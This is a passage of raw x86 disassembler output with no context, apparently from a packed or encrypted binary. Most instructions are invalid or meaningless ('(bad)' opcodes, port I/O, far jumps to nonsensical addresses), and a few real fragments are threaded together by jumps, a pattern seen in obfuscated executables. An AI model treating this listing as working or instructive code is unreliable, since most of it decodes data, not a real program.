  405a00:	fdiv   QWORD PTR [ecx+0x22]
  405a03:	es ja  0x4059d5
  405a06:	ror    dh,cl
  405a08:	xchg   esi,eax
  405a09:	sbb    ebx,DWORD PTR [ecx-0x15234d4a]
  405a0f:	cmp    BYTE PTR [esi-0x51187036],bl
  405a15:	jecxz  0x405a61
  405a17:	xor    al,0xb2
  405a19:	xor    al,BYTE PTR [eax+0x663c533d]
  405a1f:	mov    ch,0xf6
  405a21:	and    esi,eax
  405a23:	ins    DWORD PTR es:[edi],dx
  405a24:	jne    0x405a0b
  405a26:	xor    eax,DWORD PTR [edi+0x4b09a3a7]
  405a2c:	add    eax,esi
  405a2e:	adc    dl,bl
  405a30:	adc    BYTE PTR [ecx-0x245d52d],dl
  405a36:	jne    0x405a69
  405a38:	add    ch,BYTE PTR [edx]
  405a3a:	push   ds
  405a3b:	fwait
  405a3c:	(bad)  
  405a3d:	fldenv [esi]
  405a3f:	in     eax,dx
  405a40:	clc    
  405a41:	nop
  405a42:	ficom  WORD PTR [ebp-0xf]
  405a45:	(bad)  
  405a46:	fwait
  405a47:	xor    ebx,DWORD PTR fs:[edx+0x6602a3da]
  405a4e:	push   eax
  405a4f:	aam    0xa0
  405a51:	add    eax,0x4af3162a
  405a56:	pop    ebx
  405a57:	cmc    
  405a58:	or     al,0xcb
  405a5a:	and    al,0x3c
  405a5c:	popf   
  405a5d:	jg     0x405a0c
  405a5f:	sbb    eax,0x12270aec
  405a64:	sar    eax,1
  405a66:	mov    eax,DWORD PTR [edi]
  405a68:	mov    ecx,0x293051cf
  405a6d:	sbb    eax,0xd9d6b437
  405a72:	add    eax,0x491f3cfd
  405a77:	ins    DWORD PTR es:[edi],dx
  405a78:	aas    
  405a79:	mov    edx,0x24810817
  405a7e:	jp     0x405a17
  405a80:	je     0x405a29
  405a82:	add    ebp,DWORD PTR [esi-0x5544ca3]
  405a88:	push   ebp
  405a89:	pusha  
  405a8a:	mov    cl,BYTE PTR [ebx]
  405a8c:	enter  0xa7fb,0x1
  405a90:	mov    cx,0x2319
  405a94:	loopne 0x405a8a
  405a96:	cmp    BYTE PTR [esi-0xcdf4eba],al
  405a9c:	xlat   BYTE PTR ds:[ebx]
  405a9d:	mov    BYTE PTR [edx-0x68],dh
  405aa0:	hlt    
  405aa1:	sbb    eax,0x1fe8a5a1
  405aa6:	js     0x405a8b
  405aa8:	lock xor BYTE PTR [esi+0x5877eacc],dl
  405aaf:	arpl   WORD PTR [ecx-0x29dd45be],bx
  405ab5:	loop   0x405ab1
  405ab7:	mov    esp,gs
  405ab9:	sbb    bh,BYTE PTR [ecx+0x57b9c237]
  405abf:	fstp   DWORD PTR [edi+edi*4+0x24]
  405ac3:	xchg   DWORD PTR [ebp+0x62],edi
  405ac6:	cs aas 
  405ac8:	pop    eax
  405ac9:	les    esi,FWORD PTR [ecx+esi*8-0x45656952]
  405ad0:	add    dl,BYTE PTR [eax+0x65]
  405ad3:	(bad)  
  405ad5:	add    DWORD PTR [ecx+0x60],esp
  405ad8:	jmp    0xb469f537
  405add:	sub    al,0xca
  405adf:	push   ecx
  405ae0:	inc    esp
  405ae1:	push   esp
  405ae2:	pop    es
  405ae3:	imul   ebp,DWORD PTR [ebx-0x2e],0xe
  405ae7:	jae    0x405b14
  405ae9:	jmp    0xdf0a:0xe82b35e
  405af0:	push   ecx
  405af1:	retf   0x1b7
  405af4:	add    eax,0xe08c4662
  405af9:	or     BYTE PTR [esi+0xb07e226],ah
  405aff:	(bad)  
  405b00:	sar    BYTE PTR [ecx],1
  405b02:	nop
  405b03:	cdq    
  405b04:	gs or  eax,0x9a11020c
  405b0a:	push   esp
  405b0b:	dec    edx
  405b0c:	adc    dh,bh
  405b0e:	mov    ds:0xba285f0a,al
  405b13:	fild   DWORD PTR [eax+0x635aa1bf]
  405b19:	(bad)  
  405b1a:	es (bad) 
  405b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b1e:	jb     0x405b55
  405b20:	or     eax,0x84f12931
  405b25:	mov    BYTE PTR [esi+0x70],cl
  405b28:	das    
  405b29:	xchg   bh,cl
  405b2b:	fwait
  405b2c:	dec    edi
  405b2d:	mov    dh,0x8d
  405b2f:	add    BYTE PTR [ecx-0x4d],dl
  405b32:	leave  
  405b33:	dec    esi
  405b34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b35:	adc    DWORD PTR [ecx],esi
  405b37:	shl    DWORD PTR [eax*8+0x4f0699db],cl
  405b3e:	mov    ebx,DWORD PTR [edi-0x2a]
  405b41:	xchg   edx,eax
  405b42:	and    bh,BYTE PTR [edi+0x6a]
  405b45:	xchg   ecx,eax
  405b46:	stos   BYTE PTR es:[edi],al
  405b47:	xchg   esi,ebp
  405b49:	es out 0xdb,eax
  405b4c:	pop    es
  405b4d:	leave  
  405b4e:	fcom   DWORD PTR [esi+0x26b01688]
  405b54:	or     bl,0x51
  405b57:	jecxz  0x405bc1
  405b59:	ins    DWORD PTR es:[edi],dx
  405b5a:	cmp    al,0x1c
  405b5c:	ror    BYTE PTR [ebx-0x1],cl
  405b5f:	lock loope 0x405b86
  405b62:	jmp    0x98056001
  405b67:	push   ecx
  405b68:	adc    cl,BYTE PTR [edx-0x3e]
  405b6b:	out    0x63,eax
  405b6d:	mov    al,ds:0xb9d1b9d5
  405b72:	ficom  WORD PTR [edx-0x37e8296e]
  405b78:	pushf  
  405b79:	xchg   DWORD PTR ds:0x25d52fc1,edx
  405b7f:	int3   
  405b80:	dec    ebp
  405b81:	push   ecx
  405b82:	aam    0x2a
  405b84:	and    eax,0xa4fa4ec9
  405b89:	cmp    DWORD PTR [edi+edx*8-0x173047b8],edx
  405b90:	lahf   
  405b91:	dec    eax
  405b92:	jo     0x405b42
  405b94:	push   eax
  405b95:	xchg   edi,eax
  405b96:	aad    0xf7
  405b98:	mov    bh,0x7b
  405b9a:	enter  0xda26,0x34
  405b9e:	cmc    
  405b9f:	cs cmp bl,bh
  405ba2:	jo     0x405b72
  405ba4:	sub    DWORD PTR [esi+ebp*8],ebp
  405ba7:	jg     0x405bb8
  405ba9:	test   al,0xc1
  405bab:	lahf   
  405bac:	lods   eax,DWORD PTR ds:[esi]
  405bad:	pop    ds
  405bae:	mov    BYTE PTR [ecx+0x56955209],al
  405bb4:	mov    dl,0xb
  405bb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bb7:	add    al,0xe4
  405bb9:	pop    ds
  405bba:	inc    edi
  405bbb:	jl     0x405bf6
  405bbd:	mov    al,0x37
  405bbf:	and    eax,0xd7d20c4e
  405bc4:	mov    edx,0x7d77b3a9
  405bc9:	add    al,0xe8
  405bcb:	gs xchg esi,eax
  405bcd:	aam    0xa0
  405bcf:	ret    0xa6dc
  405bd2:	dec    ebp
  405bd3:	mov    al,ds:0xeca5e76b
  405bd8:	jnp    0x405bbc
  405bda:	loope  0x405c46
  405bdc:	call   0x30ad4ef1
  405be1:	jmp    0xa8ada0d8
  405be6:	push   ebx
  405be7:	retf   
  405be8:	out    0x19,eax
  405bea:	mov    ss,WORD PTR gs:[ecx-0x7ed3f5d9]
  405bf1:	xlat   BYTE PTR ds:[ebx]
  405bf2:	adc    ecx,DWORD PTR fs:[ecx-0x6ea57970]
  405bf9:	pop    eax
  405bfa:	js     0x405c70
  405bfc:	push   edi
  405bfd:	into   
  405bfe:	retf   0x5a45
  405c01:	das    
  405c02:	xchg   esp,eax
  405c03:	mov    eax,ds:0xabc1b31f
  405c08:	sbb    dh,BYTE PTR [ecx+0x1b]
  405c0b:	ins    DWORD PTR es:[edi],dx
  405c0c:	push   esi
  405c0d:	fwait
  405c0e:	dec    edx
  405c0f:	mov    al,0xe5
  405c11:	fs push edx
  405c13:	(bad)  
  405c14:	mul    DWORD PTR [ecx-0x2f]
  405c17:	ds adc al,ah
  405c1a:	push   0x4
  405c1c:	mov    esi,0xabfe1871
  405c21:	gs pop ebp
  405c23:	xor    DWORD PTR [edx+0x7b],esp
  405c26:	xor    eax,DWORD PTR [ebx+ecx*4-0x66]
  405c2a:	popa   
  405c2b:	jae    0x405c97
  405c2d:	arpl   WORD PTR [bx+si-0x5f],bx
  405c31:	mov    eax,ds:0xb9d5143e
  405c36:	int    0x44
  405c38:	ja     0x405bfa
  405c3a:	sbb    cl,bh
  405c3c:	dec    ecx
  405c3d:	push   esi
  405c3e:	das    
  405c3f:	xchg   ebx,eax
  405c40:	adc    DWORD PTR [esi*2+0x475168b],0x4f9cd93e
  405c4b:	xchg   esp,eax
  405c4c:	mov    bl,BYTE PTR [esi-0x8bce1d0]
  405c52:	in     eax,dx
  405c53:	bsr    edi,DWORD PTR [edx-0x35c70968]
  405c5a:	ins    BYTE PTR es:[edi],dx
  405c5b:	stc    
  405c5c:	lea    esi,[ecx+0x7]
  405c5f:	(bad)  
  405c60:	aam    0x0
  405c62:	test   BYTE PTR [edi-0x7c],bl
  405c65:	jno    0x405c80
  405c67:	pushf  
  405c68:	sbb    esp,DWORD PTR [edi+0x5e861a17]
  405c6e:	fdivr  DWORD PTR [edx]
  405c70:	mov    ecx,0x2b16edc5
  405c75:	cs dec esp
  405c77:	sub    al,0x9c
  405c79:	adc    eax,0x4a04f0df
  405c7e:	cmp    dh,BYTE PTR [ebx+0x66]
  405c81:	dec    ecx
  405c82:	cs sbb BYTE PTR ds:[eax+0x12a3c886],dh
  405c8a:	leave  
  405c8b:	mov    BYTE PTR [ebx],dl
  405c8d:	adc    DWORD PTR [edi+0x13],esi
  405c90:	aad    0xb2
  405c92:	das    
  405c93:	outs   dx,DWORD PTR ds:[esi]
  405c94:	(bad)  
  405c95:	xlat   BYTE PTR ds:[ebx]
  405c96:	sti    
  405c97:	add    al,0xe5
  405c99:	(bad)  
  405c9b:	jo     0x405d08
  405c9d:	(bad)  
  405c9e:	add    BYTE PTR [edi],bh
  405ca0:	sub    eax,0xfa3741d0
  405ca5:	mov    fs,WORD PTR [edi]
  405ca7:	arpl   cx,bp
  405ca9:	loop   0x405d1a
  405cab:	or     eax,0xffa1cf33
  405cb0:	test   al,0x7f
  405cb2:	lds    esp,FWORD PTR [eax-0x49]
  405cb5:	shl    ebp,0xe3
  405cb8:	mov    eax,0x94809879
  405cbd:	sub    DWORD PTR [esi+0x25779cda],0x33
  405cc4:	(bad)
  405cc7:	call   0x2a38:0x984af38c
  405cce:	cwde   
  405ccf:	data16 icebp 
  405cd1:	cmp    BYTE PTR [edx],0xda
  405cd4:	outs   dx,DWORD PTR ds:[esi]
  405cd5:	mov    ch,0x2b
  405cd7:	scas   eax,DWORD PTR es:[edi]
  405cd8:	jnp    0x405d41
  405cda:	dec    ebx
  405cdb:	pop    edi
  405cdc:	fst    QWORD PTR [edi-0xf]
  405cdf:	sahf   
  405ce0:	dec    edx
  405ce1:	sahf   
  405ce2:	sti    
  405ce3:	mov    esp,0xaebcbe3e
  405ce8:	fstp   DWORD PTR [esi-0x7a0bff4d]
  405cee:	es ret 0x85f2
  405cf2:	add    ebp,DWORD PTR [ebp+0x7092daf0]
  405cf8:	das    
  405cf9:	mov    edx,DWORD PTR [ebp-0x34]
  405cfc:	jmp    0x4063dc
  405d01:	mov    edx,DWORD PTR [ebp-0x3c]
  405d04:	mov    edi,DWORD PTR [ebp-0x4]
  405d07:	xor    edx,eax
  405d09:	xor    edi,eax
  405d0b:	add    edx,ecx
  405d0d:	add    edi,ecx
  405d0f:	imul   edx,edi
  405d12:	mov    edi,DWORD PTR [ebp-0x8]
  405d15:	mov    ebx,DWORD PTR [ebp-0x10]
  405d18:	sub    ebx,edi
  405d1a:	jmp    0x406074
  405d1f:	jmp    0xd15f6e3f
  405d24:	xor    eax,0xe321e9f1
  405d29:	les    ecx,FWORD PTR [edi]
  405d2b:	js     0x405cb1
  405d2d:	popa   
  405d2e:	mov    bl,0x2f
  405d30:	ds jle 0x405db1
  405d33:	xor    edi,DWORD PTR [ebp+0x7e]
  405d36:	jle    0x405d00
  405d38:	mul    edi
  405d3a:	fidivr DWORD PTR [edi]
  405d3c:	std    
  405d3d:	push   eax
  405d3e:	inc    esp
  405d3f:	ins    DWORD PTR es:[edi],dx
  405d40:	dec    edx
  405d41:	test   DWORD PTR gs:0xed76bac0,0x608ff648
  405d4c:	cmp    eax,0x34c1ea1d
  405d51:	aaa    
  405d52:	cli    
  405d53:	int3   
  405d54:	push   es
  405d55:	retf   0xd500
  405d58:	cmp    al,0xda
  405d5a:	pop    ebx
  405d5b:	sbb    BYTE PTR [ebp-0x53],bl
  405d5e:	rcl    DWORD PTR [ecx],cl
  405d60:	cmp    cl,ch
  405d62:	mov    edx,0x9268cba7
  405d67:	jmp    0xc2a0b2e0
  405d6c:	xchg   ebx,eax
  405d6d:	inc    ebp
  405d6e:	push   ebx
  405d6f:	fdiv   DWORD PTR [edx+0x4e]
  405d72:	xchg   ecx,eax
  405d73:	in     al,0x89
  405d75:	shl    BYTE PTR [ebx+ebp*8],0x2
  405d79:	pop    ecx
  405d7a:	and    al,0x91
  405d7c:	pop    esi
  405d7d:	pop    edx
  405d7e:	or     eax,0x4661e4b0
  405d83:	scas   al,BYTE PTR es:[edi]
  405d84:	jae    0x405d6b
  405d86:	loopne 0x405d58
  405d88:	jmp    DWORD PTR [ebp-0x68419ce7]
  405d8e:	rcr    DWORD PTR [eax-0x17c52a61],0xa4
  405d95:	in     al,0xda
  405d97:	stos   BYTE PTR es:[edi],al
  405d98:	cwde   
  405d99:	loope  0x405dae
  405d9b:	(bad)  
  405d9c:	sub    eax,0xe55dc838
  405da1:	xor    eax,0x453da7f2
  405da6:	or     eax,0xabd65c5
  405dab:	cs xor al,0x4d
  405dae:	add    bh,bh
  405db0:	xlat   BYTE PTR ds:[ebx]
  405db1:	fs inc esp
  405db3:	ror    BYTE PTR [esi],0x72
  405db6:	retf   0x860d
  405db9:	int    0x6
  405dbb:	in     al,0xcc
  405dbd:	xchg   ebx,eax
  405dbe:	lock out dx,eax
  405dc0:	and    DWORD PTR [edx+0x7e],eax
  405dc3:	dec    eax
  405dc4:	pop    edi
  405dc5:	and    al,0x8d
  405dc7:	or     eax,0x331dad96
  405dcc:	mov    cl,0x93
  405dce:	int    0x83
  405dd0:	imul   ebx,DWORD PTR [esp+eiz*2-0x67],0xffffff9a
  405dd5:	or     DWORD PTR [esi+eax*8],edx
  405dd8:	inc    ebp
  405dd9:	adc    BYTE PTR [edx-0x7c0a971b],dl
  405ddf:	add    DWORD PTR [esi+0x22a8c4d],esp
  405de5:	mov    esi,0x5b2d1567
  405dea:	jl     0x405dc0
  405dec:	push   cs
  405ded:	iret   
  405dee:	call   0xbcd52286
  405df3:	mul    DWORD PTR [edx+0x51b5b468]
  405df9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dfa:	mov    BYTE PTR [edi+0x54],bh
  405dfd:	(bad)  
  405dfe:	out    dx,eax
  405dff:	push   cs
  405e00:	pop    eax
  405e01:	push   es
  405e02:	mov    ds:0x2555ae3b,eax
  405e07:	sub    al,0x91
  405e09:	dec    ebx
  405e0a:	inc    esi
  405e0b:	adc    DWORD PTR [edx-0x1683e35b],0x7b11cd85
  405e15:	call   0xf5d0:0xaf8ed3aa
  405e1c:	pop    eax
  405e1d:	adc    eax,esi
  405e1f:	gs jmp 0x6092:0xd250c53c
  405e27:	ss nop
  405e29:	jl     0x405dd6
  405e2b:	push   edx
  405e2c:	or     ah,al
  405e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e2f:	pop    esp
  405e30:	cs addr16 dec ecx
  405e33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e34:	ja     0x405df3
  405e36:	sub    esp,DWORD PTR [eax-0x7533dd8]
  405e3c:	in     eax,0x3b
  405e3e:	(bad)  
  405e3f:	int    0xed
  405e41:	lea    esp,[eax+0x6b]
  405e44:	and    edx,DWORD PTR [ecx+0x15559783]
  405e4a:	jo     0x405e63
  405e4c:	adc    ebx,DWORD PTR [eax]
  405e4e:	ja     0x405de2
  405e50:	rol    BYTE PTR [edx+0x26],1
  405e53:	push   0x3a5323f5
  405e58:	js     0x405e0e
  405e5a:	cmp    BYTE PTR [edi],0x2
  405e5d:	xchg   ebp,eax
  405e5e:	call   0xe7b6c956
  405e63:	cwde   
  405e64:	inc    esi
  405e65:	rcl    eax,cl
  405e67:	jge    0x405ec3
  405e69:	sar    BYTE PTR [eax+0x7],0xb6
  405e6d:	xor    DWORD PTR [ecx+0xfaa0217],edi
  405e73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e74:	ja     0x405e53
  405e76:	les    eax,FWORD PTR ds:0x9dde4daa
  405e7c:	scas   eax,DWORD PTR es:[edi]
  405e7d:	sti    
  405e7e:	mov    eax,gs
  405e80:	adc    DWORD PTR [ebx+0x5c00b26d],ecx
  405e86:	cmp    ah,ah
  405e88:	mov    esi,0xf65f5fe
  405e8d:	stc    
  405e8e:	test   eax,0x6bdf5918
  405e93:	aam    0xd0
  405e95:	fnsave [ecx+edi*8-0x1f49f645]
  405e9c:	dec    edx
  405e9d:	stc    
  405e9e:	cmp    BYTE PTR [ebp-0x4e41909e],dh
  405ea4:	mov    WORD PTR [esi],fs
  405ea6:	(bad)  
  405ea7:	pmaddwd mm6,mm5
  405eaa:	inc    edx
  405eab:	and    eax,0x5104b30
  405eb0:	ret    
  405eb1:	retf   
  405eb2:	push   edi
  405eb3:	lds    esi,FWORD PTR ds:[edx]
  405eb6:	daa    
  405eb7:	mov    bh,0xb0
  405eb9:	sub    al,0xb1
  405ebb:	cmp    al,0xf7
  405ebd:	xor    BYTE PTR [ebp+0x6b61bb35],0x8
  405ec4:	cwde   
  405ec5:	pop    esp
  405ec6:	(bad)  
  405ec7:	jae    0x405eef
  405ec9:	ret    
  405eca:	hlt    
  405ecb:	xchg   ebx,eax
  405ecc:	(bad)  
  405ecd:	aad    0xab
  405ecf:	repz push 0xc
  405ed2:	adc    al,0xc3
  405ed4:	mov    ebp,0x5a2eddfe
  405ed9:	mov    DWORD PTR [edi],0x10a3a1de
  405edf:	or     ch,BYTE PTR [ebx+0x289861dd]
  405ee5:	je     0x405e69
  405ee7:	hlt    
  405ee8:	mov    al,ds:0xe3fe344b
  405eed:	shl    BYTE PTR [ecx+ecx*1],1
  405ef0:	jge    0x405f37
  405ef2:	xchg   esi,eax
  405ef3:	xor    esp,DWORD PTR [edx-0x60df2166]
  405ef9:	(bad)  
  405efb:	nop
  405efc:	call   0x555d:0xe23e7d1
  405f03:	jns    0x405f7b
  405f05:	pop    esp
  405f06:	add    cl,dl
  405f08:	mov    edx,0x19015cdd
  405f0d:	sbb    eax,0xf6f34776
  405f12:	sbb    ah,BYTE PTR [ecx+0xc]
  405f15:	dec    esp
  405f16:	and    esi,0xfffffff6
  405f19:	arpl   WORD PTR [esi],dx
  405f1b:	sbb    DWORD PTR [ebx-0x3154c18f],0x7fc615c8
  405f25:	shl    BYTE PTR ds:0x8df04e8a,1
  405f2b:	jnp    0x405ead
  405f2d:	pop    es
  405f2e:	mov    bl,0xe6
  405f30:	pop    ecx
  405f31:	mov    edi,DWORD PTR [edi]
  405f33:	adc    dl,BYTE PTR [ecx]
  405f35:	inc    esi
  405f36:	(bad)  
  405f37:	or     ecx,DWORD PTR [esi-0x7fcd9969]
  405f3d:	add    ebx,esi
  405f3f:	repnz test DWORD PTR [ebx],esp
  405f42:	push   0xb865556
  405f47:	aad    0x22
  405f49:	jg     0x405fb2
  405f4b:	aam    0xab
  405f4d:	and    edi,edx
  405f4f:	rcl    BYTE PTR [ebx],1
  405f51:	aas    
  405f52:	in     al,dx
  405f53:	xchg   ecx,eax
  405f54:	(bad)  
  405f56:	mov    ebp,0x71c3c10c
  405f5b:	(bad)  
  405f5d:	dec    esp
  405f5e:	fmul   st,st(1)
  405f60:	shr    BYTE PTR [ecx+0x68510878],cl
  405f66:	(bad)  [eax+0xa426231]
  405f6c:	push   ebp
  405f6d:	fimul  DWORD PTR [ebx+0x72]
  405f70:	fcomp  st(2)
  405f72:	fldenv [eax]
  405f74:	cmp    BYTE PTR [ebp+0x77],dh
  405f77:	inc    edx
  405f78:	sub    bh,BYTE PTR [ecx]
  405f7a:	stos   DWORD PTR es:[edi],eax
  405f7b:	xchg   esi,eax
  405f7c:	addr16 dec esp
  405f7e:	mov    dh,0x19
  405f80:	dec    esp
  405f81:	ins    DWORD PTR es:[edi],dx
  405f82:	pop    esp
  405f83:	addr16 test bl,dl
  405f86:	mov    edx,0x8e5368d5
  405f8b:	stc    
  405f8c:	jmp    0xfbce32d3
  405f91:	cmp    al,0x3
  405f93:	add    dh,BYTE PTR [edi-0x7927db95]
  405f99:	jle    0x405f58
  405f9b:	(bad)  
  405f9d:	hlt    
  405f9e:	jnp    0x406011
  405fa0:	push   eax
  405fa1:	iret   
  405fa2:	fwait
  405fa3:	lods   al,BYTE PTR ds:[esi]
  405fa4:	in     al,0x12
  405fa6:	mov    al,0xd7
  405fa8:	mov    ds:0x54412614,eax
  405fad:	pushf  
  405fae:	xor    eax,DWORD PTR [esi+eax*8-0x7f]
  405fb2:	sar    al,1
  405fb4:	test   al,0xd4
  405fb6:	in     al,dx
  405fb7:	dec    edi
  405fb8:	add    bh,BYTE PTR [ebx*4+0x2cd29d69]
  405fbf:	xchg   ebp,eax
  405fc0:	cmp    al,0xb1
  405fc2:	or     BYTE PTR [ebp-0x7d],cl
  405fc5:	sar    DWORD PTR [ebx],0xb8
  405fc8:	js     0x405f5a
  405fca:	mov    esi,0x3628640a
  405fcf:	leave  
  405fd0:	pop    es
  405fd1:	rol    DWORD PTR [ebp-0x34ff4335],cl
  405fd7:	fst    DWORD PTR fs:[ecx-0x62a9a67f]
  405fde:	gs pop es
  405fe0:	xor    ah,BYTE PTR [esi]
  405fe2:	pop    esp
  405fe3:	pop    eax
  405fe4:	scas   al,BYTE PTR es:[edi]
  405fe5:	call   FWORD PTR [esi+0x45]
  405fe8:	dec    edx
  405fe9:	sub    dh,BYTE PTR [ebp+0x4e]
  405fec:	aad    0x1c
  405fee:	loope  0x406049
  405ff0:	pop    ecx
  405ff1:	sbb    al,0x34
  405ff3:	imul   edx,DWORD PTR [ecx+eax*8],0x2ccc06a6
  405ffa:	push   ebx
  405ffb:	mov    dh,0xa9
  405ffd:	nop
  405ffe:	jmp    0x405fa9
  406000:	pop    esp
  406001:	dec    ebx
  406002:	dec    edx
  406003:	sbb    eax,0x52f10f2c
  406008:	or     esp,DWORD PTR [edx-0x4d965795]
  40600e:	retf   
  40600f:	push   ss
  406010:	call   0x7d3e6c0e
  406015:	in     al,0x44
  406017:	stos   BYTE PTR es:[edi],al
  406018:	dec    edi
  406019:	xor    dh,BYTE PTR [ebx-0x24a3f93d]
  40601f:	shl    BYTE PTR ds:0xcd5175b9,1
  406025:	pop    eax
  406026:	inc    esp
  406027:	sar    DWORD PTR [edx-0x1b],0x9c
  40602b:	rcr    DWORD PTR [edi+0x74],1
  40602e:	push   esp
  40602f:	es dec ebx
  406031:	jnp    0x405fbf
  406033:	mov    eax,ds:0xa1d8b48f
  406038:	outs   dx,DWORD PTR ds:[esi]
  406039:	fbstp  TBYTE PTR [edx-0x16]
  40603c:	and    dh,dh
  40603e:	in     al,dx
  40603f:	xor    bh,BYTE PTR [ebx+0x442fe98c]
  406045:	sub    edx,esp
  406047:	dec    edx
  406048:	ins    BYTE PTR es:[edi],dx
  406049:	fst    DWORD PTR [ebx-0x2a]
  40604c:	xchg   edi,eax
  40604d:	test   BYTE PTR [ebx+ecx*1],bl
  406050:	test   eax,0x645bbec8
  406055:	pushf  
  406056:	enter  0xd1ee,0x35
  40605a:	pop    ebp
  40605b:	xchg   ebp,eax
  40605c:	xor    eax,0xea80cd4f
  406061:	jmp    0xf207:0x3718e2f3
  406068:	sbb    BYTE PTR [edx],ch
  40606a:	mov    esp,0x991bdb29
  40606f:	or     eax,0x5998b393
  406074:	cmp    ebx,edx
  406076:	mov    edx,DWORD PTR [ebp-0x38]
  406079:	jmp    0x4063d3
  40607e:	test   eax,0x68f06eef
  406083:	jno    0x406036
  406085:	ja     0x406061
  406087:	shr    BYTE PTR [edx+0x79],0xfd
  40608b:	repnz pop ebp
  40608d:	xchg   esp,eax
  40608e:	loopne 0x4060cd
  406090:	jle    0x406110
  406092:	xor    edi,DWORD PTR [ebp+0x7e]
  406095:	jle    0x4060b8
  406097:	jg     0x406027
  406099:	jae    0x406040
  40609b:	jp     0x406054
  40609d:	push   esi
  40609e:	xchg   ecx,eax
  40609f:	sahf   
  4060a0:	adc    ebp,DWORD PTR [edi+esi*1]
  4060a3:	jb     0x4060bc
  4060a5:	inc    esi
  4060a6:	and    al,0xf1
  4060a8:	out    0x19,al
  4060aa:	cmp    ebp,esp
  4060ac:	mov    dl,0xba
  4060ae:	mov    bl,0xa5
  4060b0:	xlat   BYTE PTR ds:[ebx]
  4060b1:	ror    eax,1
  4060b3:	clc    
  4060b4:	retf   
  4060b5:	xchg   edi,eax
  4060b6:	push   0xffffff93
  4060b8:	push   edx
  4060b9:	cdq    
  4060ba:	jle    0x40603c
  4060bc:	xor    eax,0xcaab00a0
  4060c1:	idiv   DWORD PTR [esi]
  4060c3:	(bad)  
  4060c4:	jmp    0xcae37125
  4060c9:	repz sbb ecx,edx
  4060cc:	xor    dl,ah
  4060ce:	adc    al,0xf2
  4060d0:	ja     0x4060cf
  4060d2:	dec    ecx
  4060d3:	push   ds
  4060d4:	add    al,0x53
  4060d6:	iret   
  4060d7:	xor    eax,0xfcc6c84f
  4060dc:	sub    cl,BYTE PTR ds:0x165a0e26
  4060e2:	cli    
  4060e3:	lds    esi,FWORD PTR [ebp-0x4f]
  4060e6:	or     ecx,DWORD PTR [edx]
  4060e8:	and    ah,BYTE PTR ds:0x8cfb15a2
  4060ee:	fst    DWORD PTR [ecx+0x6e]
  4060f1:	ins    BYTE PTR es:[edi],dx
  4060f2:	out    0x9d,al
  4060f4:	sub    al,BYTE PTR gs:[eax-0x29e3d4da]
  4060fb:	and    DWORD PTR [esi],edx
  4060fd:	(bad)  
  4060fe:	clc    
  4060ff:	bnd jo 0x40609f
  406102:	jno    0x40617b
  406104:	hlt    
  406105:	and    eax,0x607bb07f
  40610a:	das    
  40610b:	stos   BYTE PTR es:[edi],al
  40610c:	jno    0xca82d1ff
  406112:	inc    esp
  406113:	cmp    cl,ch
  406115:	mov    bl,0x22
  406117:	jno    0x40615c
  406119:	enter  0xa07b,0x4
  40611d:	xchg   ebp,eax
  40611e:	aad    0xec
  406120:	add    al,0x1e
  406122:	mov    ?,WORD PTR [ebx+esi*8+0x25bd933a]
  406129:	loop   0x4061a3
  40612b:	inc    eax
  40612c:	xchg   edi,eax
  40612d:	arpl   WORD PTR ds:0xcab38eda,dx
  406133:	aad    0xa2
  406135:	test   al,0x41
  406137:	jmp    0x406160
  406139:	sbb    ecx,DWORD PTR [edi]
  40613b:	sbb    al,0xb8
  40613d:	mov    cl,0xb3
  40613f:	inc    esi
  406140:	test   esi,0x2ef9288d
  406146:	retf   0x13c0
  406149:	xor    BYTE PTR [ecx+0x72b67936],ch
  40614f:	leave  
  406150:	gs push cs
  406152:	pop    es
  406153:	sbb    al,0xbb
  406155:	xchg   edx,eax
  406156:	adc    DWORD PTR [ecx-0x199a4cc7],edi
  40615c:	div    ch
  40615e:	mov    ebp,0x2e644c68
  406163:	retf   
  406164:	nop
  406165:	ret    0xa42c
  406168:	push   ss
  406169:	mov    eax,0xb1de972e
  40616e:	imul   esi,DWORD PTR [ecx+0x63],0x7ab573e5
  406175:	xchg   esp,eax
  406176:	sbb    edx,ebx
  406178:	pop    DWORD PTR [ebx+esi*2-0x2d]
  40617c:	add    al,al
  40617e:	pop    eax
  40617f:	call   0x6359a945
  406184:	adc    esp,DWORD PTR [edx-0x7d2e6c57]
  40618a:	xchg   BYTE PTR [eax+eiz*1],bl
  40618d:	add    DWORD PTR [ebx-0x44],eax
  406190:	pop    ss
  406191:	pop    ecx
  406192:	mov    ebx,edx
  406194:	mov    edx,0x30a2ca71
  406199:	xlat   BYTE PTR ds:[ebx]
  40619a:	cmp    dh,BYTE PTR [ecx+0xf]
  40619d:	scas   al,BYTE PTR es:[edi]
  40619e:	pop    es
  40619f:	lds    ebx,FWORD PTR [edx+edx*2+0x3950a20e]
  4061a6:	arpl   WORD PTR [ebp-0x2c],bp
  4061a9:	aam    0xbe
  4061ab:	or     BYTE PTR [edi-0x1146663f],ch
  4061b1:	out    0xaf,al
  4061b3:	sub    ebp,esi
  4061b5:	or     al,0x8a
  4061b7:	js     0x4061e7
  4061b9:	mov    esi,0x55176ff6
  4061be:	pop    ss
  4061bf:	push   cs
  4061c0:	jg     0x406147
  4061c2:	mov    ds:0x589a458b,eax
  4061c7:	imul   esp,ebx,0xffffffd9
  4061ca:	push   esi
  4061cb:	sub    bh,BYTE PTR [ecx]
  4061cd:	shl    DWORD PTR [ebp-0x33],cl
  4061d0:	loopne 0x4061e6
  4061d2:	loope  0x4061bb
  4061d4:	pop    eax
  4061d5:	repz ss xor ebp,esi
  4061d9:	or     ch,BYTE PTR [edi]
  4061db:	sbb    DWORD PTR [esi+0x7dfa20d5],ebx
  4061e1:	push   ss
  4061e2:	int    0xb0
  4061e4:	or     eax,0x7f0505ce
  4061e9:	in     al,dx
  4061ea:	ins    BYTE PTR es:[edi],dx
  4061eb:	das    
  4061ec:	outs   dx,DWORD PTR ds:[esi]
  4061ed:	ss enter 0x3a8d,0x88
  4061f2:	out    0x88,eax
  4061f4:	jo     0x406182
  4061f6:	or     edx,ebx
  4061f8:	in     eax,dx
  4061f9:	std    
  4061fa:	inc    ebx
  4061fb:	mov    cl,0x52
  4061fd:	mov    DWORD PTR [ebx+0x56a2a9fd],esi
  406203:	dec    esp
